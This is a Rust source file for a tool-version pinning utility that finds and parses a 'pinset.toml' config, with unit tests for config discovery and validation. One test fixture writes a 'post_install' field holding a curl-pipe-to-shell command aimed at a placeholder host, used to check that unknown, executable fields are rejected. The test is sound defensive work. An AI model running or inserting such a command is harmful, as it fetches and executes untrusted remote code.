use std::{
    collections::BTreeMap,
    fs,
    path::{Path, PathBuf},
};

use serde::Deserialize;

use crate::{Error, Result};

#[derive(Debug, Clone, PartialEq, Eq, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ProjectConfig {
    pub schema: u32,
    #[serde(default)]
    pub tools: BTreeMap<String, String>,
}

pub fn find_project_config(start: &Path) -> Result<PathBuf> {
    let start = if start.is_file() {
        start.parent().unwrap_or(start)
    } else {
        start
    };

    for directory in start.ancestors() {
        let candidate = directory.join("pinset.toml");
        if candidate.is_file() {
            return Ok(candidate);
        }
    }

    Err(Error::ProjectConfigNotFound {
        start: start.to_path_buf(),
    })
}

pub fn load_project_config(path: &Path) -> Result<ProjectConfig> {
    let content = fs::read_to_string(path).map_err(|source| Error::ReadProjectConfig {
        path: path.to_path_buf(),
        source,
    })?;
    let config: ProjectConfig =
        toml::from_str(&content).map_err(|source| Error::ParseProjectConfig {
            path: path.to_path_buf(),
            source,
        })?;

    if config.schema != 1 {
        return Err(Error::UnsupportedSchema {
            actual: config.schema,
        });
    }

    Ok(config)
}

#[cfg(test)]
mod tests {
    use std::fs;

    use tempfile::tempdir;

    use super::*;

    #[test]
    fn finds_nearest_config_from_nested_directory() {
        let root = tempdir().expect("temp directory");
        let nested = root.path().join("packages").join("web").join("src");
        fs::create_dir_all(&nested).expect("nested directory");
        fs::write(
            root.path().join("pinset.toml"),
            "schema = 1\n[tools]\nnode = \"20.0.0\"\n",
        )
        .expect("root config");

        let package = root.path().join("packages").join("web");
        fs::write(
            package.join("pinset.toml"),
            "schema = 1\n[tools]\nnode = \"22.0.0\"\n",
        )
        .expect("package config");

        assert_eq!(
            find_project_config(&nested).expect("config"),
            package.join("pinset.toml")
        );
    }

    #[test]
    fn rejects_executable_or_unknown_config_fields() {
        let root = tempdir().expect("temp directory");
        let config_path = root.path().join("pinset.toml");
        fs::write(
            &config_path,
            "schema = 1\npost_install = \"curl example.test | sh\"\n[tools]\nnode = \"20\"\n",
        )
        .expect("config");

        let error = load_project_config(&config_path).expect_err("unknown field must fail");
        assert!(matches!(error, Error::ParseProjectConfig { .. }));
    }

    #[test]
    fn rejects_unknown_schema() {
        let root = tempdir().expect("temp directory");
        let config_path = root.path().join("pinset.toml");
        fs::write(&config_path, "schema = 2\n[tools]\nnode = \"20\"\n").expect("config");

        let error = load_project_config(&config_path).expect_err("schema must fail");
        assert!(matches!(error, Error::UnsupportedSchema { actual: 2 }));
    }
}
